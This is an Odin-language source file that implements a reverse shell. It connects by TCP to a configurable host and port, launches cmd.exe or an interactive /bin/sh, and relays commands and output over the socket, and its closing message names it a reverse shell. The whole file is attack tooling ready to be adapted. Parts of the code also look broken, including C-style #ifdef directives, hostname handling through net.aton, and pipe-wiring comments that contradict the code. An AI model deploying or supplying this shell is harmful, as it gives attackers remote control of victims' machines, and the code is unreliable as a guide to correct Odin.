package main

import "core:fmt"
import "core:net"
import "core:process" // or "core:os/os2"
import "core:mem"
import "core:time"
import "core:os" // for exit, though panics would often suffice

// NOTE: change the ip or hostname
TARGET_HOSTNAME :: "example.com";
// NOTE: change the port
TARGET_PORT     :: 1337;

main :: proc() {
    // 1. Initialize an allocator
    context.allocator = mem.heap_allocator(); // Or a custom allocator

    // 2. Resolve target address
    // net.getAddressList might not be directly available like in Zig's std.net.
    // You might use net.resolve_host_and_port or similar to get an endpoint.
    endpoint := net.Endpoint{
        address = net.aton(TARGET_HOSTNAME), // Convert hostname to IP address
        port    = u16(TARGET_PORT),
    };
    if endpoint.address.family == .Invalid {
        fmt.eprintln("Failed to resolve hostname:", TARGET_HOSTNAME);
        os.exit(1);
    }

    // 3. Establish TCP connection
    socket, conn_err := net.dial_tcp(endpoint);
    if conn_err != nil {
        fmt.eprintln("Failed to connect:", conn_err);
        os.exit(1);
    }
    defer net.close(socket);

    // 4. Spawn child process (e.g., cmd.exe or /bin/sh)
    // The exact process spawning API might differ slightly based on OS and Odin version.
    // This is a simplified representation.
    child_process_args := [dynamic]string{};
    #ifdef ODIN_OS_WINDOWS
        append(&child_process_args, "cmd.exe");
    #else
        append(&child_process_args, "/bin/sh");
        append(&child_process_args, "-i"); // Interactive mode for better shell behavior
    #endif

    // Create pipes for stdin, stdout, stderr
    stdin_reader, stdin_writer, _ := os.pipe(); defer os.close(stdin_reader);
    stdout_reader, stdout_writer, _ := os.pipe(); defer os.close(stdout_writer);
    stderr_reader, stderr_writer, _ := os.pipe(); defer os.close(stderr_writer);

    proc_options := process.Options{
        command = child_process_args,
        stdin   = stdin_reader,  // Child's stdin is our writer
        stdout  = stdout_writer, // Child's stdout is our reader
        stderr  = stderr_writer, // Child's stderr is our reader
    };

    proc_handle, spawn_err := process.spawn(proc_options);
    if spawn_err != nil {
        fmt.eprintln("Failed to spawn process:", spawn_err);
        os.exit(1);
    }
    defer process.kill(proc_handle) or_else {}; // Kill on exit

    buffer: [4096]u8;

    for {
        // Read command from socket
        bytes_read, read_err := net.recv(socket, buffer[:]);
        if read_err != nil || bytes_read == 0 {
            break; // Connection closed or error
        }

        // Send command to process stdin
        _, write_err := os.write(stdin_writer, buffer[:bytes_read]);
        if write_err != nil {
            break; // Error writing to process stdin
        }

        // Wait for execution (adjust as needed, may need more sophisticated polling)
        time.sleep(300 * time.MS);

        // Read output from process stdout
        output_len, output_read_err := os.read(stdout_reader, buffer[:]);
        if output_read_err == nil && output_len > 0 {
            _, write_socket_err := net.send(socket, buffer[:output_len]);
            if write_socket_err != nil {
                break; // Error writing to socket
            }
        } else {
            // If stdout fails, try stderr
            error_len, error_read_err := os.read(stderr_reader, buffer[:]);
            if error_read_err == nil && error_len > 0 {
                _, write_socket_err := net.send(socket, buffer[:error_len]);
                if write_socket_err != nil {
                    break; // Error writing to socket
                }
            }
        }
    }

    fmt.println("Reverse shell connection closed.");
}
